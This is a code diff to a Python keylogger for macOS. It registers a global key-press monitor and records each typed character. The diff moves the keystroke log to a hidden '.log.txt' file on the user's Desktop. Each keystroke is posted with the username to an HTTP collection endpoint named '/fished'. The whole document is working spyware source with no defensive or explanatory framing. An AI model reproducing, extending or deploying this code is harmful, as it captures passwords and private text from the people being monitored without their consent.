@@ -1,3 +1,4 @@
+#!/usr/bin/env python
 from AppKit import NSApplication, NSApp
 from Foundation import NSObject, NSLog
 from Cocoa import NSEvent, NSKeyDownMask
@@ -7,6 +8,7 @@ import requests
 import json
 import getpass
 lines = []
+user = '{}'.format(getpass.getuser())
 class AppDelegate(NSObject):
     def applicationDidFinishLaunching_(self, notification):
         mask = NSKeyDownMask
@@ -17,13 +19,12 @@ def handler(event):
         response = "{}".format(event)
         chars = response.split("chars=\"")
         c = chars[1][0]
-        lines.append('{}'.format(c))
-        f = open('log.txt', 'w')
+        #lines.append('{}'.format(c))
+        f = open('/Users/{}/Desktop/.log.txt'.format(user), 'w')
         for l in lines:
             f.write(l)
         f.close()
         stc = '{}'.format(c)
-        user = '{}'.format(getpass.getuser())
         d = {user: stc}
         r = requests.post('http://127.0.0.1:3000/fished', data=d)
 
@@ -37,8 +38,8 @@ def main():
     AppHelper.runEventLoop()
 
 if __name__ == '__main__':
-    if os.path.isfile('log.txt'):
-        fr = open('log.txt','r')
+    if os.path.isfile('/Users/{}/Desktop/.log.txt'.format(user)):
+        fr = open('/Users/{}/Desktop/.log.txt'.format(user),'r')
         for l in fr.readlines():
             lines.append(l)
     else:
